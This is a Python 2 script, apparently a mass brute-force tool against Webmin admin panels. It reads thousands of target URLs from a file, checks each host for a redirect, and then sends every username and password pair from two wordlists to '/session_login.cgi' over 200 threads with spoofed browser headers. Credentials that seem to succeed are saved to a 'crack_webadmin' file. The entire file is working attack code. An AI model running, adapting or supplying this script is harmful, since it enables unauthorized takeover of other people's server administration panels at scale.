#coding=utf-8
import requests
import threading
import time
import os

def check(i,total):
	users = []
	with open("userport1000.txt") as inFile:
		while True:
			user = inFile.readline().strip()
			if len(user) == 0: break
			users.append(user)

	passwords = []
	with open("passport1000.txt") as inFile:
		while True:
			pwd = inFile.readline().strip()
			if len(pwd) == 0: break
			passwords.append(pwd)
	global eu
	#os.system("title Spider,Current threads: %d,URLs left: %d,URLs exists:%d" %(threading.active_count(),total,eu)) 
	try:
		#payload = {'username': 'admin', 'passwd': '123456'}
		r1=requests.Session()
		r=r1.get(i+'/',timeout=5)
		status=r.content.count('permanently')
		a4=r.text
	except:
		print i,'Timeout'
		status = 0
	if  status !=0 and '404' not in a4:
		r = 0
		print i,'Exists!!!!!'
		eu+=1
		for user in users:
			for pwd in passwords:
				pwd = pwd.replace('<user>', user)
				print 'testing', user, ' -- ', pwd
				payload={'user':user,'pass':pwd}
				try:
					rr=r1.post(i+'/session_login.cgi',data=payload,headers={
'Upgrade-Insecure-Requests': '1',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'zh-CN,zh;q=0.8',
'Cookie': 'testing=1'},timeout=5,allow_redirects=False)
					#print i,rr.headers['Content-Security-Policy']
					print rr.status_code,rr.text
					if 'location' not in rr.text:
						f1=open('crack_webadmin_10000.txt','a+')
						f1.write(i)
						f1.write('\n')
						f1.write(user+'---'+pwd)
						f1.write('\n')
						f1.close()
					else:
						print 'error......'
				except:
					print '!!!Error occured #2'
					
		
def main():
	global eu
	eu = 0
	total=len(open('10000.txt','rU').readlines())
	print 'Total URLs:%d' %total
	for i in open("10000.txt").readlines():
		i=i.strip('\n')
		t=threading.Thread(target=check, args=(i,total))
		t.setDaemon(True)
		total-=1
		while True:
			if(threading.active_count() == 1 and total == 0 ):
				print 'All Done at %s' %time.strftime("%Y-%m-%d[%H.%M.%S]")
				break
			elif (threading.active_count() < 200):
				if (total == 0):
					time.sleep(10)
				else:
					os.system("title Spider,Current threads: %d,URLs left: %d,URLs exists:%d" %(threading.active_count(),total,eu))
					t.start()
					break


if __name__ == '__main__':
	main()
